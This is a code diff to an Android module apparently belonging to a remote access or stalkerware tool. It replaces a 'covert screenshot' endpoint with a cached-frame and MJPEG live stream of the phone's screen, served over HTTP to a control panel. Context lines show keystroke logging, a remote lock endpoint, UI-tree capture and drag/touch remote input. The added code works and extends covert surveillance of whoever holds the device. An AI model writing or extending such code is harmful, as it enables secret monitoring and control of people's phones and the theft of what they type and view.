@@ -5,9 +5,11 @@ import android.content.Intent;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.SystemClock;
 import android.util.Log;
 
 import com.labs.labrats.FirebaseConfig;
+import com.labs.labrats.GhostStreamer;
 import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.SystemAnalytics;
 
@@ -35,7 +37,15 @@ public class GhostModule extends BaseModule {
             IO_Persistence_Manager.clearKeystrokes();
             return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
         } else if (uri.equals("/ghost/screenshot")) {
-            return serveCovertScreenshot();
+            return serveScreenshotSmart(params);
+        } else if (uri.equals("/ghost/frame")) {
+            return serveCachedFrame(params);
+        } else if (uri.equals("/ghost/stream")) {
+            return serveMjpegStream();
+        } else if (uri.equals("/ghost/stat")) {
+            return serveStreamStat();
+        } else if (uri.equals("/ghost/quality")) {
+            return setStreamQuality(params);
         } else if (uri.equals("/ghost/status")) {
             return serveGhostStatus();
         } else if (uri.equals("/ghost/lock")) {
@@ -245,9 +255,31 @@ public class GhostModule extends BaseModule {
         return newResponse(Response.Status.OK, "application/json", ghost.captureUiTree());
     }
 
-    private Response serveCovertScreenshot() {
+    // ============ GHOST_STREAM v2: cached frames + MJPEG push ============
+
+    /**
+     * Legacy endpoint kept working: serves the cached frame instantly when fresh
+     * (&lt;2s old), otherwise falls back to one blocking capture (?fresh=1 forces it).
+     */
+    private Response serveScreenshotSmart(Map<String, String> params) {
         IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
         if (ghost == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Ghost Service Offline");
+
+        GhostStreamer streamer = GhostStreamer.get();
+        streamer.ensureRunning(ghost);
+        boolean forceFresh = params != null && "1".equals(params.get("fresh"));
+        if (!forceFresh) {
+            GhostStreamer.Frame cached = streamer.latest();
+            if (cached != null && cached.data != null
+                    && SystemClock.uptimeMillis() - cached.timeMs < 2000) {
+                streamer.poke();
+                Response r = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg",
+                        new java.io.ByteArrayInputStream(cached.data), cached.data.length);
+                r.addHeader("X-Frame-Seq", String.valueOf(cached.seq));
+                r.addHeader("X-Ghost-Source", "cache");
+                return r;
+            }
+        }
 
         final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
         final byte[][] result = new byte[1][];
@@ -270,7 +302,10 @@ public class GhostModule extends BaseModule {
         try {
             if (latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) {
                 if (result[0] != null) {
-                    return server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", new java.io.ByteArrayInputStream(result[0]), result[0].length);
+                    Response r = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg",
+                            new java.io.ByteArrayInputStream(result[0]), result[0].length);
+                    r.addHeader("X-Ghost-Source", "fresh");
+                    return r;
                 } else {
                     return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screenshot Failed: " + error[0]);
                 }
@@ -280,6 +315,129 @@ public class GhostModule extends BaseModule {
         } catch (Exception e) {
             return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Internal Error: " + e.getMessage());
         }
+    }
+
+    /** Instant cached frame. ?seq=N returns {"unchanged":true} instead of bytes when nothing is new. */
+    private Response serveCachedFrame(Map<String, String> params) {
+        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+        if (ghost == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Ghost Service Offline");
+
+        GhostStreamer streamer = GhostStreamer.get();
+        streamer.ensureRunning(ghost);
+        streamer.poke();
+        GhostStreamer.Frame f = streamer.latest();
+        if (f == null || f.data == null) {
+            return newResponse(Response.Status.OK, "application/json", "{\"warming\":true}");
+        }
+        if (params != null && params.containsKey("seq")) {
+            try {
+                if (Long.parseLong(params.get("seq")) == f.seq) {
+                    return newResponse(Response.Status.OK, "application/json",
+                            "{\"unchanged\":true,\"seq\":" + f.seq + "}");
+                }
+            } catch (NumberFormatException ignored) {}
+        }
+        Response r = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg",
+                new java.io.ByteArrayInputStream(f.data), f.data.length);
+        r.addHeader("X-Frame-Seq", String.valueOf(f.seq));
+        r.addHeader("X-Frame-Age-Ms", String.valueOf(SystemClock.uptimeMillis() - f.timeMs));
+        return r;
+    }
+
+    /**
+     * MJPEG push stream: one long-lived multipart response the browser renders
+     * natively. No per-frame HTTP handshake, no Image() churn — this is what
+     * makes the feed feel realtime instead of a slideshow.
+     */
+    private Response serveMjpegStream() {
+        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+        if (ghost == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Ghost Service Offline");
+
+        final GhostStreamer streamer = GhostStreamer.get();
+        streamer.ensureRunning(ghost);
+        streamer.addViewer();
+
+        final java.io.PipedOutputStream pos;
+        final java.io.PipedInputStream pis;
+        try {
+            pos = new java.io.PipedOutputStream();
+            pis = new java.io.PipedInputStream(pos, 256 * 1024);
+        } catch (java.io.IOException e) {
+            streamer.removeViewer();
+            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Stream Setup Failed");
+        }
+
+        Thread writer = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    long deadline = SystemClock.uptimeMillis() + 5 * 60 * 1000; // 5 min max per connection
+                    long lastSent = -1;
+                    long lastBeat = 0;
+                    while (SystemClock.uptimeMillis() < deadline) {
+                        GhostStreamer.Frame f = streamer.latest();
+                        long now = SystemClock.uptimeMillis();
+                        if (f != null && f.data != null && (f.seq != lastSent || now - lastBeat > 2000)) {
+                            String head = "--frame\r\nContent-Type: image/jpeg\r\nContent-Length: "
+                                    + f.data.length + "\r\nX-Frame-Seq: " + f.seq + "\r\n\r\n";
+                            pos.write(head.getBytes("UTF-8"));
+                            pos.write(f.data);
+                            pos.write("\r\n".getBytes("UTF-8"));
+                            pos.flush();
+                            lastSent = f.seq;
+                            lastBeat = now;
+                        }
+                        try {
+                            Thread.sleep(33);
+                        } catch (InterruptedException ie) {
+                            break;
+                        }
+                    }
+                } catch (java.io.IOException ioe) {
+                    // Client went away — normal stream teardown.
+                } finally {
+                    streamer.removeViewer();
+                    try {
+                        pos.close();
+                    } catch (Exception ignored) {}
+                }
+            }
+        }, "GhostMjpeg");
+        writer.setDaemon(true);
+        writer.start();
+
+        Response r = server.newChunkedResponseProxy(Response.Status.OK,
+                "multipart/x-mixed-replace; boundary=frame", pis);
+        r.addHeader("Cache-Control", "no-store");
+        return r;
+    }
+
+    private Response serveStreamStat() {
+        GhostStreamer s = GhostStreamer.get();
+        GhostStreamer.Frame f = s.latest();
+        long now = SystemClock.uptimeMillis();
+        StringBuilder j = new StringBuilder("{");
+        j.append("\"running\":").append(s.isRunning()).append(",");
+        j.append("\"viewers\":").append(s.viewerCount()).append(",");
+        j.append("\"profile\":\"").append(s.getProfileName()).append("\",");
+        j.append("\"targetFps\":").append(s.getTargetFps()).append(",");
+        j.append("\"fps\":").append(String.format(java.util.Locale.US, "%.1f", s.getMeasuredFps())).append(",");
+        j.append("\"seq\":").append(f != null ? f.seq : 0).append(",");
+        j.append("\"ageMs\":").append(f != null ? (now - f.timeMs) : -1).append(",");
+        j.append("\"bytes\":").append(f != null && f.data != null ? f.data.length : 0).append(",");
+        j.append("\"width\":").append(f != null ? f.width : 0).append(",");
+        j.append("\"height\":").append(f != null ? f.height : 0);
+        j.append("}");
+        return newResponse(Response.Status.OK, "application/json", j.toString());
+    }
+
+    private Response setStreamQuality(Map<String, String> params) {
+        String profile = params != null ? params.get("profile") : null;
+        boolean ok = GhostStreamer.get().setProfile(profile);
+        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+        if (ghost != null) GhostStreamer.get().ensureRunning(ghost);
+        return newResponse(Response.Status.OK, "application/json",
+                "{\"success\":" + ok + ",\"profile\":\"" + GhostStreamer.get().getProfileName() + "\"}");
     }
 
     private Response serveGhostPage(IHTTPSession session) {
@@ -388,9 +546,15 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
         html.append("<div class=\"phone-notch\"></div>");
         html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
-        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none; touch-action: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
+        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none; touch-action: none; background: #000;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
         html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
         html.append("</div></div>");
+        html.append("<div style=\"display:flex; gap:10px; justify-content:center; margin:15px 0 5px 0;\">");
+        html.append("<button onclick=\"ghostQuality('smooth')\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">SMOOTH</button>");
+        html.append("<button onclick=\"ghostQuality('balanced')\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green);\">BALANCED</button>");
+        html.append("<button onclick=\"ghostQuality('sharp')\" class=\"btn btn-small\" style=\"border-color:var(--neon-yellow); color:var(--neon-yellow);\">SHARP</button>");
+        html.append("</div>");
+        html.append("<div id=\"ghost-stream-stat\" style=\"color:#888; font-size:0.65rem; letter-spacing:2px; text-align:center; margin-bottom:10px;\">MJPEG_STREAM_READY</div>");
         html.append("</div>");
 
         // Action Cluster (Grouped for alignment and centering)
